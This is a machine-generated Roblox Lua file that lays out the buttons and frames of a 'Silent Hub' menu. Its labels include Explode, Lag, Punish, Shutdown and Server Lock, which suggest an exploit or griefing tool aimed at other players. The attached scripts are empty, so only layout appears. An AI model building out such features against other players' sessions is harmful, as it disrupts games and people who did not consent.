G2L["3b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3b"]["Size"] = UDim2.new(0, 76, 0, 22);
G2L["3b"]["Name"] = [[Button]];
G2L["3b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3b"]["Text"] = [[Explode]];
G2L["3b"]["Position"] = UDim2.new(0.49852, 0, 0.18571, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.LocalScript
G2L["3c"] = Instance.new("LocalScript", G2L["3b"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.UIStroke
G2L["3d"] = Instance.new("UIStroke", G2L["3b"]);
G2L["3d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["3d"]["Thickness"] = 1.8;
G2L["3d"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button
G2L["3e"] = Instance.new("TextButton", G2L["30"]);
G2L["3e"]["TextWrapped"] = true;
G2L["3e"]["BorderSizePixel"] = 0;
G2L["3e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3e"]["TextSize"] = 12;
G2L["3e"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["3e"]["RichText"] = true;
G2L["3e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3e"]["Size"] = UDim2.new(0, 76, 0, 22);
G2L["3e"]["Name"] = [[Button]];
G2L["3e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3e"]["Text"] = [[Fire]];
G2L["3e"]["Position"] = UDim2.new(0.49852, 0, 0.18571, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.LocalScript
G2L["3f"] = Instance.new("LocalScript", G2L["3e"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.UIStroke
G2L["40"] = Instance.new("UIStroke", G2L["3e"]);
G2L["40"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["40"]["Thickness"] = 1.8;
G2L["40"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button
G2L["41"] = Instance.new("TextButton", G2L["30"]);
G2L["41"]["TextWrapped"] = true;
G2L["41"]["BorderSizePixel"] = 0;
G2L["41"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["41"]["TextSize"] = 12;
G2L["41"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["41"]["RichText"] = true;
G2L["41"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["41"]["Size"] = UDim2.new(0, 76, 0, 22);
G2L["41"]["Name"] = [[Button]];
G2L["41"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["41"]["Text"] = [[Sparkles]];
G2L["41"]["Position"] = UDim2.new(0.49852, 0, 0.18571, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.LocalScript
G2L["42"] = Instance.new("LocalScript", G2L["41"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.UIStroke
G2L["43"] = Instance.new("UIStroke", G2L["41"]);
G2L["43"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["43"]["Thickness"] = 1.8;
G2L["43"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button
G2L["44"] = Instance.new("TextButton", G2L["30"]);
G2L["44"]["TextWrapped"] = true;
G2L["44"]["BorderSizePixel"] = 0;
G2L["44"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["44"]["TextSize"] = 12;
G2L["44"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["44"]["RichText"] = true;
G2L["44"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["44"]["Size"] = UDim2.new(0, 76, 0, 22);
G2L["44"]["Name"] = [[Button]];
G2L["44"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["44"]["Text"] = [[Forcefield]];
G2L["44"]["Position"] = UDim2.new(0.49852, 0, 0.18571, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.LocalScript
G2L["45"] = Instance.new("LocalScript", G2L["44"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.UIStroke
G2L["46"] = Instance.new("UIStroke", G2L["44"]);
G2L["46"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["46"]["Thickness"] = 1.8;
G2L["46"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button
G2L["47"] = Instance.new("TextButton", G2L["30"]);
G2L["47"]["TextWrapped"] = true;
G2L["47"]["BorderSizePixel"] = 0;
G2L["47"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["47"]["TextSize"] = 12;
G2L["47"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["47"]["RichText"] = true;
G2L["47"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["47"]["Size"] = UDim2.new(0, 76, 0, 22);
G2L["47"]["Name"] = [[Button]];
G2L["47"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["47"]["Text"] = [[Un-Forcefield]];
G2L["47"]["Position"] = UDim2.new(0.49852, 0, 0.18571, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.LocalScript
G2L["48"] = Instance.new("LocalScript", G2L["47"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.UIStroke
G2L["49"] = Instance.new("UIStroke", G2L["47"]);
G2L["49"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["49"]["Thickness"] = 1.8;
G2L["49"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button
G2L["4a"] = Instance.new("TextButton", G2L["30"]);
G2L["4a"]["TextWrapped"] = true;
G2L["4a"]["BorderSizePixel"] = 0;
G2L["4a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4a"]["TextSize"] = 12;
G2L["4a"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["4a"]["RichText"] = true;
G2L["4a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4a"]["Size"] = UDim2.new(0, 76, 0, 22);
G2L["4a"]["Name"] = [[Button]];
G2L["4a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4a"]["Text"] = [[Freeze]];
G2L["4a"]["Position"] = UDim2.new(0.49852, 0, 0.18571, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.LocalScript
G2L["4b"] = Instance.new("LocalScript", G2L["4a"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.UIStroke
G2L["4c"] = Instance.new("UIStroke", G2L["4a"]);
G2L["4c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["4c"]["Thickness"] = 1.8;
G2L["4c"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button
G2L["4d"] = Instance.new("TextButton", G2L["30"]);
G2L["4d"]["TextWrapped"] = true;
G2L["4d"]["BorderSizePixel"] = 0;
G2L["4d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4d"]["TextSize"] = 12;
G2L["4d"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["4d"]["RichText"] = true;
G2L["4d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4d"]["Size"] = UDim2.new(0, 76, 0, 22);
G2L["4d"]["Name"] = [[Button]];
G2L["4d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4d"]["Text"] = [[Thaw]];
G2L["4d"]["Position"] = UDim2.new(0.49852, 0, 0.18571, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.LocalScript
G2L["4e"] = Instance.new("LocalScript", G2L["4d"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.UIStroke
G2L["4f"] = Instance.new("UIStroke", G2L["4d"]);
G2L["4f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["4f"]["Thickness"] = 1.8;
G2L["4f"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button
G2L["50"] = Instance.new("TextButton", G2L["30"]);
G2L["50"]["TextWrapped"] = true;
G2L["50"]["BorderSizePixel"] = 0;
G2L["50"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["50"]["TextSize"] = 12;
G2L["50"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["50"]["RichText"] = true;
G2L["50"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["50"]["Size"] = UDim2.new(0, 76, 0, 22);
G2L["50"]["Name"] = [[Button]];
G2L["50"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["50"]["Text"] = [[Remove Tools]];
G2L["50"]["Position"] = UDim2.new(0.49852, 0, 0.18571, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.LocalScript
G2L["51"] = Instance.new("LocalScript", G2L["50"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.UIStroke
G2L["52"] = Instance.new("UIStroke", G2L["50"]);
G2L["52"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["52"]["Thickness"] = 1.8;
G2L["52"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button
G2L["53"] = Instance.new("TextButton", G2L["30"]);
G2L["53"]["TextWrapped"] = true;
G2L["53"]["BorderSizePixel"] = 0;
G2L["53"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["53"]["TextSize"] = 12;
G2L["53"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["53"]["RichText"] = true;
G2L["53"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["53"]["Size"] = UDim2.new(0, 76, 0, 22);
G2L["53"]["Name"] = [[Button]];
G2L["53"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["53"]["Text"] = [[Smoke]];
G2L["53"]["Position"] = UDim2.new(0.49852, 0, 0.18571, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.LocalScript
G2L["54"] = Instance.new("LocalScript", G2L["53"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.UIStroke
G2L["55"] = Instance.new("UIStroke", G2L["53"]);
G2L["55"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["55"]["Thickness"] = 1.8;
G2L["55"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button
G2L["56"] = Instance.new("TextButton", G2L["30"]);
G2L["56"]["TextWrapped"] = true;
G2L["56"]["BorderSizePixel"] = 0;
G2L["56"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["56"]["TextSize"] = 12;
G2L["56"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["56"]["RichText"] = true;
G2L["56"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["56"]["Size"] = UDim2.new(0, 76, 0, 22);
G2L["56"]["Name"] = [[Button]];
G2L["56"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["56"]["Text"] = [[Lag]];
G2L["56"]["Position"] = UDim2.new(0.49852, 0, 0.18571, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.LocalScript
G2L["57"] = Instance.new("LocalScript", G2L["56"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.UIStroke
G2L["58"] = Instance.new("UIStroke", G2L["56"]);
G2L["58"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["58"]["Thickness"] = 1.8;
G2L["58"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button
G2L["59"] = Instance.new("TextButton", G2L["30"]);
G2L["59"]["TextWrapped"] = true;
G2L["59"]["BorderSizePixel"] = 0;
G2L["59"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["59"]["TextSize"] = 12;
G2L["59"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["59"]["RichText"] = true;
G2L["59"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["59"]["Size"] = UDim2.new(0, 76, 0, 22);
G2L["59"]["Name"] = [[Button]];
G2L["59"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["59"]["Text"] = [[Punish]];
G2L["59"]["Position"] = UDim2.new(0.49852, 0, 0.18571, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.LocalScript
G2L["5a"] = Instance.new("LocalScript", G2L["59"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.UIStroke
G2L["5b"] = Instance.new("UIStroke", G2L["59"]);
G2L["5b"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["5b"]["Thickness"] = 1.8;
G2L["5b"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button
G2L["5c"] = Instance.new("TextButton", G2L["30"]);
G2L["5c"]["TextWrapped"] = true;
G2L["5c"]["BorderSizePixel"] = 0;
G2L["5c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5c"]["TextSize"] = 12;
G2L["5c"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["5c"]["RichText"] = true;
G2L["5c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5c"]["Size"] = UDim2.new(0, 76, 0, 22);
G2L["5c"]["Name"] = [[Button]];
G2L["5c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5c"]["Text"] = [[GodMode]];
G2L["5c"]["Position"] = UDim2.new(0.49852, 0, 0.18571, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.LocalScript
G2L["5d"] = Instance.new("LocalScript", G2L["5c"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.UIStroke
G2L["5e"] = Instance.new("UIStroke", G2L["5c"]);
G2L["5e"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["5e"]["Thickness"] = 1.8;
G2L["5e"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button
G2L["5f"] = Instance.new("TextButton", G2L["30"]);
G2L["5f"]["TextWrapped"] = true;
G2L["5f"]["BorderSizePixel"] = 0;
G2L["5f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5f"]["TextSize"] = 12;
G2L["5f"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["5f"]["RichText"] = true;
G2L["5f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5f"]["Size"] = UDim2.new(0, 76, 0, 22);
G2L["5f"]["Name"] = [[Button]];
G2L["5f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5f"]["Text"] = [[Un-GodMode]];
G2L["5f"]["Position"] = UDim2.new(0.49852, 0, 0.18571, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.LocalScript
G2L["60"] = Instance.new("LocalScript", G2L["5f"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.UIStroke
G2L["61"] = Instance.new("UIStroke", G2L["5f"]);
G2L["61"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["61"]["Thickness"] = 1.8;
G2L["61"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button
G2L["62"] = Instance.new("TextButton", G2L["30"]);
G2L["62"]["TextWrapped"] = true;
G2L["62"]["BorderSizePixel"] = 0;
G2L["62"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["62"]["TextSize"] = 12;
G2L["62"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["62"]["RichText"] = true;
G2L["62"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["62"]["Size"] = UDim2.new(0, 76, 0, 22);
G2L["62"]["Name"] = [[Button]];
G2L["62"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["62"]["Text"] = [[Creeper]];
G2L["62"]["Position"] = UDim2.new(0.49852, 0, 0.18571, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.LocalScript
G2L["63"] = Instance.new("LocalScript", G2L["62"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.UIStroke
G2L["64"] = Instance.new("UIStroke", G2L["62"]);
G2L["64"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["64"]["Thickness"] = 1.8;
G2L["64"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button
G2L["65"] = Instance.new("TextButton", G2L["30"]);
G2L["65"]["TextWrapped"] = true;
G2L["65"]["BorderSizePixel"] = 0;
G2L["65"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["65"]["TextSize"] = 12;
G2L["65"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["65"]["RichText"] = true;
G2L["65"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["65"]["Size"] = UDim2.new(0, 76, 0, 22);
G2L["65"]["Name"] = [[Button]];
G2L["65"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["65"]["Text"] = [[Midget]];
G2L["65"]["Position"] = UDim2.new(0.49852, 0, 0.18571, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.LocalScript
G2L["66"] = Instance.new("LocalScript", G2L["65"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.Independent.Button.UIStroke
G2L["67"] = Instance.new("UIStroke", G2L["65"]);
G2L["67"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["67"]["Thickness"] = 1.8;
G2L["67"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Players.LocalScript
G2L["68"] = Instance.new("LocalScript", G2L["10"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server
G2L["69"] = Instance.new("Frame", G2L["6"]);
G2L["69"]["Visible"] = false;
G2L["69"]["BorderSizePixel"] = 0;
G2L["69"]["BackgroundColor3"] = Color3.fromRGB(66, 66, 66);
G2L["69"]["Size"] = UDim2.new(0, 500, 0, 223);
G2L["69"]["Position"] = UDim2.new(0, 0, 0, 0);
G2L["69"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["69"]["Name"] = [[Server]];


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main
G2L["6a"] = Instance.new("Frame", G2L["69"]);
G2L["6a"]["BorderSizePixel"] = 0;
G2L["6a"]["BackgroundColor3"] = Color3.fromRGB(66, 66, 66);
G2L["6a"]["Size"] = UDim2.new(0, 300, 0, 188);
G2L["6a"]["Position"] = UDim2.new(0.4, 0, 0.15695, 0);
G2L["6a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6a"]["Name"] = [[Main]];


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Input
G2L["6b"] = Instance.new("TextBox", G2L["6a"]);
G2L["6b"]["Name"] = [[Input]];
G2L["6b"]["PlaceholderColor3"] = Color3.fromRGB(75, 75, 75);
G2L["6b"]["BorderSizePixel"] = 0;
G2L["6b"]["TextWrapped"] = true;
G2L["6b"]["TextSize"] = 14;
G2L["6b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6b"]["BackgroundColor3"] = Color3.fromRGB(223, 223, 223);
G2L["6b"]["RichText"] = true;
G2L["6b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6b"]["PlaceholderText"] = [[Input]];
G2L["6b"]["Size"] = UDim2.new(0, 235, 0, 20);
G2L["6b"]["Position"] = UDim2.new(-0.22667, 0, 0.13298, 0);
G2L["6b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6b"]["Text"] = [[]];


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Input.UIStroke
G2L["6c"] = Instance.new("UIStroke", G2L["6b"]);
G2L["6c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["6c"]["Thickness"] = 1.8;
G2L["6c"]["Color"] = Color3.fromRGB(116, 116, 116);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent
G2L["6d"] = Instance.new("ScrollingFrame", G2L["6a"]);
G2L["6d"]["Active"] = true;
G2L["6d"]["BorderSizePixel"] = 0;
G2L["6d"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["6d"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["6d"]["Name"] = [[Dependent]];
G2L["6d"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y;
G2L["6d"]["Size"] = UDim2.new(0, 499, 0, 120);
G2L["6d"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6d"]["Position"] = UDim2.new(-0.66667, 0, 0.35991, 0);
G2L["6d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6d"]["ScrollBarThickness"] = 5;


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.UIListLayout
G2L["6e"] = Instance.new("UIListLayout", G2L["6d"]);
G2L["6e"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["6e"]["HorizontalFlex"] = Enum.UIFlexAlignment.SpaceEvenly;
G2L["6e"]["Wraps"] = true;
G2L["6e"]["Padding"] = UDim.new(0.05, 0);
G2L["6e"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["6e"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["6e"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button
G2L["6f"] = Instance.new("TextButton", G2L["6d"]);
G2L["6f"]["TextWrapped"] = true;
G2L["6f"]["BorderSizePixel"] = 0;
G2L["6f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6f"]["TextSize"] = 12;
G2L["6f"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["6f"]["RichText"] = true;
G2L["6f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6f"]["Size"] = UDim2.new(0, 76, 0, 22);
G2L["6f"]["Name"] = [[Button]];
G2L["6f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6f"]["Text"] = [[Create Hint]];
G2L["6f"]["Position"] = UDim2.new(0.05812, 0, 0.05833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
G2L["70"] = Instance.new("LocalScript", G2L["6f"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.UIStroke
G2L["71"] = Instance.new("UIStroke", G2L["6f"]);
G2L["71"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["71"]["Thickness"] = 1.8;
G2L["71"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button
G2L["72"] = Instance.new("TextButton", G2L["6d"]);
G2L["72"]["TextWrapped"] = true;
G2L["72"]["BorderSizePixel"] = 0;
G2L["72"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["72"]["TextSize"] = 12;
G2L["72"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["72"]["RichText"] = true;
G2L["72"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["72"]["Size"] = UDim2.new(0, 76, 0, 22);
G2L["72"]["Name"] = [[Button]];
G2L["72"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["72"]["Text"] = [[Create Message]];
G2L["72"]["Position"] = UDim2.new(0.28024, 0, 0.05833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
G2L["73"] = Instance.new("LocalScript", G2L["72"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.UIStroke
G2L["74"] = Instance.new("UIStroke", G2L["72"]);
G2L["74"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["74"]["Thickness"] = 1.8;
G2L["74"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button
G2L["75"] = Instance.new("TextButton", G2L["6d"]);
G2L["75"]["TextWrapped"] = true;
G2L["75"]["BorderSizePixel"] = 0;
G2L["75"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["75"]["TextSize"] = 12;
G2L["75"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["75"]["RichText"] = true;
G2L["75"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["75"]["Size"] = UDim2.new(0, 76, 0, 22);
G2L["75"]["Name"] = [[Button]];
G2L["75"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["75"]["Text"] = [[Shutdown]];
G2L["75"]["Position"] = UDim2.new(0.50236, 0, 0.05833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
G2L["76"] = Instance.new("LocalScript", G2L["75"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.UIStroke
G2L["77"] = Instance.new("UIStroke", G2L["75"]);
G2L["77"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["77"]["Thickness"] = 1.8;
G2L["77"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button
G2L["78"] = Instance.new("TextButton", G2L["6d"]);
G2L["78"]["TextWrapped"] = true;
G2L["78"]["BorderSizePixel"] = 0;
G2L["78"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["78"]["TextSize"] = 12;
G2L["78"]["BackgroundColor3"] = Color3.fromRGB(46, 46, 46);
G2L["78"]["RichText"] = true;
G2L["78"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["78"]["Size"] = UDim2.new(0, 76, 0, 22);
G2L["78"]["Name"] = [[Button]];
G2L["78"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["78"]["Text"] = [[Server Lock]];
G2L["78"]["Position"] = UDim2.new(0.72448, 0, 0.05833, 0);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.LocalScript
G2L["79"] = Instance.new("LocalScript", G2L["78"]);



-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button.UIStroke
G2L["7a"] = Instance.new("UIStroke", G2L["78"]);
G2L["7a"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["7a"]["Thickness"] = 1.8;
G2L["7a"]["Color"] = Color3.fromRGB(31, 31, 31);


-- StarterGui.Silent Hub.Main.MainContainer.Pages.Server.Main.Dependent.Button
G2L["7b"] = Instance.new("TextButton", G2L["6d"]);
G2L["7b"]["TextWrapped"] = true;
G2L["7b"]["BorderSizePixel"] = 0;
